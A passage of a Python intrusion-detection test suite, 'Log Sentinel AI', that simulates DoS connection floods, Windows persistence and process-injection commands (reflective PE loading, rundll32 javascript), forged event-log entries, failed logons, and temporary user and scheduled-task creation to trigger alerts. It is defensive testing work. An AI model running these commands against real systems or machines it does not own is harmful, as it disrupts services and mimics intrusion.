        info("Connection pool exhaustion...")
        ex_count = 0
        sockets = []
        for _ in range(50):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((self.target_ip, 80))
                s.send(b"GET / HTTP/1.1\r\nHost: target\r\nConnection: keep-alive\r\n\r\n")
                sockets.append(s)
                ex_count += 1
            except Exception:
                break
        for s in sockets:
            try:
                s.close()
            except Exception:
                pass
        self._record("dos", "Connection Exhaustion", "COMPLETED",
                     f"{ex_count} concurrent connections opened (connection pool test)", "HIGH")
        ok(f"Connection exhaustion: {ex_count} concurrent")

        highlight("  ✓ DoS module complete — IDS should flag: DOS / HIGH")

    # ══════════════════════════════════════════════════════════════════
    # MODULE 8 — Host Intrusion (Windows-specific)
    # ══════════════════════════════════════════════════════════════════

    def module_host(self):
        """Host-based intrusion signals — registry, processes, services."""
        section("HOST INTRUSION SIGNALS")

        if platform.system() != "Windows":
            info("Skipping Windows-specific host intrusion tests")
            return

        # 8a — Registry persistence points
        time.sleep(self.delay)
        info("Registry persistence simulation...")
        reg_paths = [
            r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
            r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell",
            r"HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce",
        ]
        reg_count = 0
        for path in reg_paths:
            success, _ = self._run_cmd(["reg", "query", path])
            if success:
                reg_count += 1
        self._record("host", "Registry Recon", "COMPLETED",
                     f"{reg_count} persistence-related registry keys queried", "MEDIUM")
        ok(f"Registry persistence: {reg_count} locations probed")

        # 8b — Service manipulation
        time.sleep(self.delay)
        info("Service manipulation simulation...")
        svc_queries = [
            ["sc", "query"],
            ["sc", "query", "type=", "service", "state=", "all"],
            ["sc", "qc", "eventlog"],
        ]
        svc_count = 0
        for cmd in svc_queries:
            success, _ = self._run_cmd(cmd)
            if success:
                svc_count += 1
        self._record("host", "Service Recon", "COMPLETED",
                     f"{svc_count} service enumeration commands executed", "MEDIUM")
        ok(f"Service recon: {svc_count} queries")

        # 8c — Scheduled tasks (persistence)
        time.sleep(self.delay)
        info("Scheduled task enumeration...")
        success, tasks = self._run_cmd(["schtasks", "/query", "/fo", "LIST"])
        self._record("host", "Scheduled Tasks", "COMPLETED",
                     f"Scheduled tasks queried: {len(tasks)} chars of output", "LOW")
        ok("Scheduled tasks enumerated")

        # 8d — Process injection pattern
        time.sleep(self.delay)
        info("Process creation with injection-like flags...")
        inject_patterns = [
            ["powershell", "-Command", "Invoke-ReflectivePEInjection -PEBytes $bytes"],
            ["cmd.exe", "/c", "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\""],
            ["powershell", "-Command", "System.Reflection.Assembly.Load($bytes).EntryPoint.Invoke(0, $null)"],
        ]
        inj_count = 0
        for cmd in inject_patterns:
            try:
                subprocess.run(cmd, capture_output=True, timeout=3)
                inj_count += 1
            except Exception:
                pass
        self._record("host", "Process Injection", "COMPLETED",
                     f"{inj_count} process injection-like commands (reflective load pattern)", "CRITICAL")
        ok(f"Process injection patterns: {inj_count}")

        highlight("  ✓ Host intrusion module complete — IDS should flag: HOST_INTRUSION / HIGH")

    # ══════════════════════════════════════════════════════════════════
    # MODULE 9 — Windows Event Log Injection (Direct Detection Test)
    # ══════════════════════════════════════════════════════════════════

    def module_windows_events(self):
        """
        Directly inject Windows Event Log entries for every threat category.

        This is the PRIMARY detection test for Log Sentinel AI.
        The system reads Windows Event Logs (Security, System, Application).
        Network-level modules (recon/bruteforce/dos/exfil) generate TCP/UDP
        traffic that Windows does NOT log — this module fills that gap by
        writing Application-log events whose text matches the log_collector's
        THREAT_KEYWORDS, PLUS triggering real Security events (failed logons,
        scheduled task creation, user account creation) that map to
        WINDOWS_HIGH_PRIORITY_IDS (4625, 4698, 4720, …).
        """
        section("WINDOWS EVENT LOG INJECTION — Direct Detection Test")

        if platform.system() != "Windows":
            warn("Skipping — Windows-only module")
            return

        # ── Part 1: Keyword-rich events → Application channel ─────────────
        # The log_collector groups all Application events in the same minute
        # into one block (win_Application_HHMM_general).  Writing 6 events
        # per category (36 total) in < 1 minute creates one large anomalous
        # block whose threat_hits vector lights up every category at once.
        #
        # THREAT_KEYWORDS (from log_collector.py):
        #   brute_force  : failed, invalid, wrong password, authentication failure,
        #                  login failed, bad credentials
        #   privilege_esc: privilege, escalation, sudo, root, admin, elevated,
        #                  permission denied, unauthorized
        #   dos          : flood, overload, too many requests, rate limit,
        #                  connection refused, timeout
        #   log_tamper   : deleted, modified, cleared, truncated, log rotation
        #   startup      : startup, boot, init, service start, autorun,
        #                  scheduled task, cron
        #   network      : port scan, ssh, firewall, connection attempt,
        #                  remote, intrusion
        #
        # Check admin — eventcreate requires Administrator on Windows 10/11
        admin = _is_admin()
        if not admin:
            print(f"\n  {Color.R}{'─'*60}{Color.U}")
            print(f"  {Color.R}✗  NOT RUNNING AS ADMINISTRATOR{Color.U}")
            print(f"  {Color.Y}  Writing to Windows Event Log requires Administrator.{Color.U}")
            print(f"  {Color.Y}  → Re-run: right-click terminal → Run as Administrator{Color.U}")
            print(f"  {Color.Y}  → Or use:  python {Path(sys.argv[0]).name} --module windows_events --elevate{Color.U}")
            print(f"  {Color.R}{'─'*60}{Color.U}\n")
            print(f"  {Color.C}→{Color.U}  Attempting anyway (failed logons still work without admin)...\n")

        info("Injecting keyword-matching events to Application log (eventcreate)...")

        keyword_events = {
            "brute_force": (500, [
                "Security audit: authentication failure for user Administrator from 10.0.0.1",
                "Logon failure: bad credentials supplied - login failed for guest account",
                "Brute force: failed logon attempt - wrong password on Administrator",
                "Invalid credentials supplied: failed authentication from remote host",
                "Multiple authentication failures: login failed after bad credentials",
                "Audit failure: login failed with wrong password - account Administrator",
            ]),
            "privilege_esc": (501, [
                "Privilege escalation detected: elevated token requested by process explorer.exe",
                "Admin access acquired: elevated rights via RunAs - unauthorized",
                "Escalation to root/admin detected: permission denied then overridden",
                "Elevated process created: privilege escalation vector exploited",
                "Unauthorized admin elevation attempt: escalation to administrator",
                "Security: elevated rights granted - privilege escalation succeeded",
            ]),
            "dos": (502, [
                "DoS protection triggered: too many requests from 192.168.1.1 - rate limit hit",
                "Service flooding detected: connection refused after flood threshold exceeded",
                "Overload condition: too many requests causing timeout on port 8080",
                "Rate limit exceeded: connection refused to API - DoS flood in progress",
                "DDoS mitigation: overload state - rate limit enforced on all connections",
                "Timeout: too many concurrent connections - service overload from flood",
            ]),
            "log_tamper": (503, [
                "Security alert: audit log entries deleted by unauthorized process",
                "Log rotation triggered: old entries cleared from security event log",
                "Warning: event log modified - entries truncated by external script",
                "Audit log cleared: cleared entries detected in security channel",
                "Security log entries deleted: modified by non-admin process",
                "Log truncated: cleared event history - log rotation forced",
            ]),
            "startup": (504, [
                "Autorun entry registered at startup: persistence mechanism detected",
                "Scheduled task created for boot time execution - new persistence",
                "Service start configured: init script registered as autorun entry",
                "Cron-like job registered: startup persistence via scheduled task",
                "Boot time entry added: autorun modified in startup configuration",
                "New autorun service registered: runs at system init automatically",
            ]),
            "network": (505, [
                "Intrusion detection: port scan from 10.0.0.200 targeting multiple ports",
                "Firewall alert: SSH connection attempt blocked from external IP",
                "Network intrusion detected: port scan in progress on subnet",
                "Remote connection attempt to restricted port - firewall intrusion alert",
                "IDS alert: port scan detected - connection attempt blocked by firewall",
                "SSH brute force: remote intrusion attempt from 192.168.100.5",
            ]),
        }

        inject_total = 0
        for cat, (evt_id, messages) in keyword_events.items():
            cat_count = 0
            for msg in messages:
                safe_msg = msg.replace('"', "'").replace("&", "and")
                cmd = ["eventcreate", "/T", "WARNING",
                       "/ID", str(evt_id),
                       "/L", "APPLICATION",
                       "/D", safe_msg]
                ok_flag, _ = self._run_cmd(cmd, timeout=5)
                if ok_flag:
                    cat_count += 1
            inject_total += cat_count
            self._record("windows_events", f"Keyword injection: {cat}",
                         "COMPLETED" if cat_count >= 3 else "PARTIAL",
                         f"{cat_count}/{len(messages)} events written to Application log",
                         "HIGH")
            if cat_count >= 3:
                ok(f"{cat}: {cat_count} events injected to Application log")
            else:
                warn(f"{cat}: only {cat_count} events written (eventcreate may need admin)")
        info(f"Total Application log events injected: {inject_total}")

        # ── Part 2: Real Security channel events ──────────────────────────
        # These map to WINDOWS_HIGH_PRIORITY_IDS and create separate,
        # properly-categorised blocks in the Security channel.
        # Requires Administrator for most; runs silently if not elevated.
        info("")
        info("Triggering real Security channel events (requires Administrator)...")

        # 4625 — Failed logon → brute_force block
        info("  Failed logon attempts → Event 4625 (brute_force) ...")
        bf_count = 0
        for _ in range(5):
            ok_flag, _ = self._run_cmd(
                ["net", "use", r"\\127.0.0.1\IPC$", "",
                 "/user:sentinel_brutetest", "WrongPass_99!"],
                timeout=5
            )
            if ok_flag is False:
                bf_count += 1   # net use returns non-zero on failed auth = event generated
        self._record("windows_events", "Failed Logon (Event 4625)",
                     "COMPLETED",
                     "5 failed net use attempts → Security log Event 4625 (brute_force)",
                     "CRITICAL")
        ok("  Failed logon events triggered")

        # 4698/4699 — Scheduled task create/delete → startup block
        info("  Scheduled task create → Event 4698 (startup) ...")
        ok_create, _ = self._run_cmd(
            ["schtasks", "/create", "/tn", "SentinelIDSTest",
             "/sc", "once", "/st", "00:00", "/tr", "cmd.exe", "/f"],
            timeout=5
        )
        ok_delete, _ = self._run_cmd(
            ["schtasks", "/delete", "/tn", "SentinelIDSTest", "/f"],
            timeout=5
        )
        self._record("windows_events", "Scheduled Task (Event 4698)",
                     "COMPLETED" if ok_create else "NEEDS_ADMIN",
                     "schtasks create/delete → Security log Event 4698/4699 (startup)",
                     "HIGH")
        ok("  Scheduled task events triggered" if ok_create else
           "  Scheduled task (may need admin for Security log event)")

        # 4720/4726 — User account create/delete → privilege_esc block
        info("  User account create/delete → Event 4720 (privilege_esc) ...")
        ok_add, _ = self._run_cmd(
            ["net", "user", "sentinel_testacct", "Temp_Pass123!", "/add"],
            timeout=5
        )
        self._run_cmd(["net", "user", "sentinel_testacct", "/delete"], timeout=5)
        self._record("windows_events", "User Account Create (Event 4720)",
                     "COMPLETED" if ok_add else "NEEDS_ADMIN",
                     "net user /add → Security log Event 4720 (privilege_esc)",
                     "CRITICAL")
        ok("  User account events triggered" if ok_add else
           "  User create (needs admin for Security log event)")

        # 4719 — Audit policy change → log_tamper block
        info("  Audit policy query → Event 4719 probe (log_tamper) ...")
        self._run_cmd(["auditpol", "/get", "/category:*"], timeout=5)
        self._record("windows_events", "Audit Policy Probe (Event 4719)",
                     "COMPLETED",
                     "auditpol query + Application log cleared-keyword events",
                     "HIGH")
        ok("  Audit policy probe executed")

        highlight("  ✓ Windows Event Log module complete")
        highlight("  ✓ Wait up to 30s for the log collector to pick up these events")
        highlight("  ✓ Dashboard should show: brute_force, privilege_esc, dos,")
        highlight("    log_tamper, startup, network (from Application log keywords)")
        highlight("    PLUS category-specific blocks from Security log events")

    # ══════════════════════════════════════════════════════════════════
    # REPORTING
    # ══════════════════════════════════════════════════════════════════

    def generate_report(self):
        """Generate HTML and JSON reports of all test results."""
        section("GENERATING REPORT")

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        json_path = self.report_dir / f"ids_test_results_{timestamp}.json"
        html_path = self.report_dir / f"ids_test_report_{timestamp}.html"

        # JSON report
        report_data = {
            "metadata": {
                "timestamp": datetime.now().isoformat(),
                "target": self.target_ip,
                "hostname": socket.gethostname(),
                "platform": platform.platform(),
                "python": sys.version
            },
            "summary": {},
            "modules": self.results
        }

        # Calculate summary
        total_tests = 0
        passed = 0
        severity_counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
        for module, tests in self.results.items():
            for test in tests:
                total_tests += 1
                if test["status"] != "FAILED":
                    passed += 1
                sev = test.get("severity", "MEDIUM")
                severity_counts[sev] = severity_counts.get(sev, 0) + 1

        report_data["summary"] = {
            "total_tests": total_tests,
            "passed": passed,
            "failed": total_tests - passed,
            "pass_rate": f"{(passed/total_tests)*100:.1f}%" if total_tests > 0 else "N/A",
            "severity_breakdown": severity_counts
        }

        with open(json_path, "w", encoding="utf-8") as f:
            json.dump(report_data, f, indent=2, ensure_ascii=False)

        # HTML report
        html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Log Sentinel AI — IDS Test Report</title>
    <style>
        body {{ font-family: 'Segoe UI', Arial, sans-serif; background: #0d1117; color: #c9d1d9; margin: 0; padding: 20px; }}
        .container {{ max-width: 1200px; margin: auto; }}
        h1 {{ color: #58a6ff; border-bottom: 2px solid #30363d; padding-bottom: 10px; }}
        h2 {{ color: #79c0ff; margin-top: 30px; }}
        .summary {{ background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 20px; display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; margin: 20px 0; }}
        .stat {{ text-align: center; }}
        .stat-value {{ font-size: 2em; font-weight: bold; }}
        .stat-label {{ font-size: 0.8em; color: #8b949e; }}
        .pass {{ color: #3fb950; }}
        .fail {{ color: #f85149; }}
        .crit {{ color: #ff7b72; }}
        .high {{ color: #d29922; }}
        .med {{ color: #58a6ff; }}
        .low {{ color: #8b949e; }}
        table {{ width: 100%; border-collapse: collapse; margin: 15px 0; }}
        th, td {{ padding: 10px 12px; text-align: left; border-bottom: 1px solid #21262d; }}
        th {{ background: #161b22; color: #58a6ff; }}
        tr:hover {{ background: #1c2128; }}
        .sev-CRITICAL {{ color: #ff7b72; font-weight: bold; }}
        .sev-HIGH {{ color: #d29922; font-weight: bold; }}
        .sev-MEDIUM {{ color: #58a6ff; }}
        .sev-LOW {{ color: #8b949e; }}
        .badge {{ display: inline-block; padding: 2px 8px; border-radius: 12px; font-size: 0.8em; font-weight: bold; }}
        .badge-CRITICAL {{ background: #ff7b7233; color: #ff7b72; }}
        .badge-HIGH {{ background: #d2992233; color: #d29922; }}
        .badge-MEDIUM {{ background: #58a6ff33; color: #58a6ff; }}
        .badge-LOW {{ background: #8b949e33; color: #8b949e; }}
        .footer {{ margin-top: 40px; padding-top: 20px; border-top: 1px solid #30363d; color: #8b949e; font-size: 0.9em; }}
    </style>
</head>
<body>
<div class="container">
    <h1>Log Sentinel AI — IDS Test Report</h1>
    <p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | Target: {self.target_ip}</p>

    <div class="summary">
        <div class="stat"><div class="stat-value">{report_data['summary']['total_tests']}</div><div class="stat-label">Total Tests</div></div>
        <div class="stat"><div class="stat-value pass">{report_data['summary']['passed']}</div><div class="stat-label">Passed</div></div>
        <div class="stat"><div class="stat-value fail">{report_data['summary']['failed']}</div><div class="stat-label">Failed</div></div>
        <div class="stat"><div class="stat-value">{report_data['summary']['pass_rate']}</div><div class="stat-label">Pass Rate</div></div>
    </div>

    <h2>Severity Breakdown</h2>
    <div class="summary">
        <div class="stat"><div class="stat-value crit">{severity_counts.get('CRITICAL', 0)}</div><div class="stat-label">Critical</div></div>
        <div class="stat"><div class="stat-value high">{severity_counts.get('HIGH', 0)}</div><div class="stat-label">High</div></div>
        <div class="stat"><div class="stat-value med">{severity_counts.get('MEDIUM', 0)}</div><div class="stat-label">Medium</div></div>
        <div class="stat"><div class="stat-value low">{severity_counts.get('LOW', 0)}</div><div class="stat-label">Low</div></div>
    </div>

    <h2>Detailed Results</h2>"""

        for module, tests in self.results.items():
            html_content += f"\n    <h3>{module.upper()}</h3>\n    <table>\n"
            html_content += "        <tr><th>ID</th><th>Test</th><th>Severity</th><th>Status</th><th>Details</th></tr>\n"
            for test in tests:
                sev = test.get("severity", "MEDIUM")
                st = test["status"]
                html_content += f"""        <tr>
            <td>{html.escape(test['id'])}</td>
            <td>{html.escape(test['test'])}</td>
            <td><span class="badge badge-{sev}">{sev}</span></td>
            <td class="{'pass' if st == 'COMPLETED' else 'fail'}">{html.escape(st)}</td>
            <td>{html.escape(test['detail'])}</td>
        </tr>\n"""
            html_content += "    </table>\n"

        html_content += f"""
    <div class="footer">
        <p>Log Sentinel AI — IDS Testing Suite v1.0</p>
        <p>Test environment: {platform.platform()} | Python {sys.version}</p>
    </div>
</div>
</body>
</html>"""

        with open(html_path, "w", encoding="utf-8") as f:
            f.write(html_content)

        ok(f"JSON report: {json_path}")
        ok(f"HTML report: {html_path}")
        return html_path

    # ══════════════════════════════════════════════════════════════════
    # RUNNER
    # ══════════════════════════════════════════════════════════════════

    def run_all(self):
        """Run all test modules sequentially."""
        print(BANNER)
        print(f"  Target: {Color.B}{self.target_ip}{Color.U}")
        print(f"  Host:   {socket.gethostname()}")
        print(f"  Time:   {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"\n  {'─' * 60}\n")

        modules = [
            # windows_events FIRST: injects detectable events immediately so
            # the log collector picks them up while other modules are running
            ("windows_events", self.module_windows_events, "Windows Event Log Injection"),
            ("recon",          self.module_recon,           "Network Reconnaissance"),
            ("bruteforce",     self.module_bruteforce,      "Brute Force Attacks"),
            ("web",            self.module_web,             "Web Application Attacks"),
            ("payloads",       self.module_payloads,        "Payload Delivery"),
            ("evasion",        self.module_evasion,         "Evasion Techniques"),
            ("exfil",          self.module_exfil,           "Data Exfiltration"),
            ("dos",            self.module_dos,             "Denial of Service"),
            ("host",           self.module_host,            "Host Intrusion"),
        ]

        for name, fn, desc in modules:
            highlight(f"=== Module: {desc} ===")
            try:
                fn()
            except KeyboardInterrupt:
                warn(f"Module {name} skipped (interrupted)")
            except Exception as e:
                err(f"Module {name} failed: {e}")
            print()

        self.generate_report()

        total = sum(len(t) for t in self.results.values())
        print(f"\n  {'═' * 60}")
        highlight(f"  TESTING COMPLETE: {total} tests across {len(self.results)} modules")
        info("Check the Log Sentinel AI dashboard for detected alerts")
        info(f"Reports saved to: {self.report_dir.resolve()}")
        print(f"  {'═' * 60}\n")


# ══════════════════════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description="Log Sentinel AI — IDS/IPS Testing Suite",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
            Examples:
              %(prog)s --all                  # Run all modules
              %(prog)s --module web           # Run web attacks only
              %(prog)s --module recon,evasion # Run specific modules
              %(prog)s --target 10.0.0.5      # Test remote target
              %(prog)s --list                 # List available modules
              %(prog)s --continuous           # Continuous attack mode
        """)
    )

    parser.add_argument("--all", action="store_true", help="Run all test modules")
    parser.add_argument("--module", "-m", nargs="+", help="Specific module(s) to run")
    parser.add_argument("--target", "-t", default="127.0.0.1",
                       help="Target IP address (default: 127.0.0.1)")
    parser.add_argument("--port", "-p", type=int, nargs="+", default=None,
                       help="Target ports (default: common ports)")
    parser.add_argument("--list", "-l", action="store_true",
                       help="List available modules and exit")
    parser.add_argument("--continuous", "-c", action="store_true",
                       help="Run in continuous attack mode")
    parser.add_argument("--delay", "-d", type=int, default=2,
                       help="Delay in seconds between tests (default: 2)")
    parser.add_argument("--verbose", "-v", action="store_true",
                       help="Verbose output")
    parser.add_argument("--report", "-r", action="store_true",
                       help="Generate report from existing results")
    parser.add_argument("--output", "-o", default="ids_test_reports",
                       help="Report output directory")
    parser.add_argument("--elevate", action="store_true",
                       help="Re-launch with UAC Administrator privileges (Windows only). "
                            "Required for the windows_events module to inject Application log entries.")

    args = parser.parse_args()

    # Handle elevation before anything else
    if args.elevate and platform.system() == "Windows":
        if not _is_admin():
            print(f"  {Color.C}→{Color.U}  Requesting UAC elevation...")
            _relaunch_as_admin()   # exits this process
        else:
            print(f"  {Color.G}✓{Color.U}  Already running as Administrator.")

    MODULES = {
        "windows_events": ("Windows Event Log Injection",
                           "Directly injects detectable events for ALL threat categories "
                           "(brute_force, privilege_esc, dos, log_tamper, startup, network). "
                           "PRIMARY detection test for Log Sentinel AI — run this first."),
        "recon":          ("Network Reconnaissance",
                           "Port scans, OS fingerprinting, DNS recon "
                           "[network traffic only — not detected by Windows Event Logs]"),
        "bruteforce":     ("Brute Force Attacks",
                           "SSH, RDP, HTTP, SMB brute force "
                           "[network traffic only — use windows_events for log-based detection]"),
        "web":            ("Web Application Attacks",
                           "SQLi, XSS, LFI, SSRF, RCE, upload abuse "
                           "[HTTP traffic only — not detected by Windows Event Logs]"),
        "payloads":       ("Payload Delivery",
                           "Encoded PowerShell, download cradles, process injection "
                           "[generates suspicious_process / privilege_esc / log_tamper events]"),
        "evasion":        ("Evasion Techniques",
                           "Fragmentation, encoding, timing, protocol anomalies "
                           "[network packets only — not detected by Windows Event Logs]"),
        "exfil":          ("Data Exfiltration",
                           "DNS/HTTP/ICMP tunnels, large transfers "
                           "[network traffic only — not detected by Windows Event Logs]"),
        "dos":            ("Denial of Service",
                           "SYN/ICMP floods, slow attacks (limited) "
                           "[network packets only — not detected by Windows Event Logs]"),
        "host":           ("Host Intrusion",
                           "Registry, services, scheduled tasks, process injection "
                           "[generates host-based events — complements windows_events]"),
    }

    if args.list:
        print(f"\n  {Color.C}Available Test Modules:{Color.U}\n")
        for name, (desc, details) in MODULES.items():
            print(f"  {Color.G}{name:<15}{Color.U} {desc}")
            print(f"  {'':16}{Color.DIM}{details}{Color.U}")
            print()
        return

    tester = IDSTester(
        target_ip=args.target,
        target_ports=args.port,
        report_dir=args.output,
        verbose=args.verbose,
        delay_between=args.delay
    )

    if args.report:
        tester.generate_report()
        return

    if args.continuous:
        print(BANNER)
        highlight(f"  CONTINUOUS ATTACK MODE — targeting {args.target}")
        info("Press Ctrl+C to stop\n")
        try:
            cycle = 0
            while True:
                cycle += 1
                print(f"\n{Color.C}─── CYCLE {cycle} ───{Color.U}\n")
                for name in MODULES:
                    fn = getattr(tester, f"module_{name}")
                    try:
                        fn()
                    except Exception as e:
                        err(f"Module {name} failed: {e}")
                    time.sleep(args.delay)
                tester.generate_report()
        except KeyboardInterrupt:
            info("Continuous mode stopped")
        return

    if args.all:
        tester.run_all()
        return

    if args.module:
        print(BANNER)
        for mod_name in args.module:
            if mod_name in MODULES:
                highlight(f"=== Module: {MODULES[mod_name][0]} ===")
                fn = getattr(tester, f"module_{mod_name}")
                try:
                    fn()
                except KeyboardInterrupt:
                    warn(f"Module {mod_name} skipped")
                except Exception as e:
                    err(f"Module {mod_name} failed: {e}")
                print()
        tester.generate_report()
        return

    parser.print_help()


if __name__ == "__main__":
    main()
